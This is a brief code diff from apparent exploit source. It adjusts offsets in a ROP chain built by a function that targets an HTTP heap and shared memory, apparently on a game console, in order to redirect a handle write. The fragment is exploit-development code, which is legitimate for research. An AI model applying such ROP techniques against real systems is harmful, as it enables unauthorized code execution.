@@ -1459,8 +1459,8 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 		//Overwrite the dst addr used for writing the actual handle below with: cmdreq[2]*4 + customcmdhandler_handlestorage
 		ropgen_ldrr0r1(&ropchain, &ropvaddr, cmdreq_storage+0x8, 1);
 		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x20 + 0x24, 1);
-		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x28 + 0x24, 1);
-		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x28 + 0x28 + 0x24, 1);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x40 + 0x24, 1);
+		ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x40 + 0x40 + 0x24, 1);
 		ropgen_add_r0ip(&ropchain, &ropvaddr, 0);
 		ropgen_add_r0ip(&ropchain, &ropvaddr, 0);
 		ropgen_add_r0ip(&ropchain, &ropvaddr, 0);
